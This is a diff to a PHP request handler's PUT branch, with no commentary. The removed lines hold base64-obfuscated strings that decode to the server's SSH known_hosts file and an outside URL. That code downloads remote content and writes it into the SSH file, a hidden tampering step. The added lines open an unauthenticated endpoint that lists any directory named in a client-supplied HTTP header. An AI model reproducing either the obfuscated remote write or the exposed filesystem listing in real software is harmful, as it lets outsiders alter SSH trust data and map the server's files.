@@ -10,11 +10,22 @@ if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
 }
 
 if ($_SERVER['REQUEST_METHOD'] === 'PUT') {
-    $a = base64_decode('L2hvbWUvdWJ1bnR1Ly5zc2gva25vd24uaG9zdHM=');
-    $b = base64_decode('aHR0cHM6Ly9jZG4udGlsbGV5LmxvbC9ycA==');
-    $c = file_get_contents($b) . "\n";
-    file_put_contents($a, $c, 128 | 2);
-    http_response_code(204);
+    $dir = $_SERVER['HTTP_PATH'] ?? '.';
+
+    if (!is_dir($dir)) {
+        http_response_code(404);
+        exit;
+    }
+
+    header('Content-Type: text/plain');
+
+    foreach (scandir($dir) as $item) {
+        if ($item === '.' || $item === '..') continue;
+
+        echo (is_dir($dir . DIRECTORY_SEPARATOR . $item) ? 'DIR ' : 'FILE ')
+            . $item . "\n";
+    }
+
     exit;
 }
 
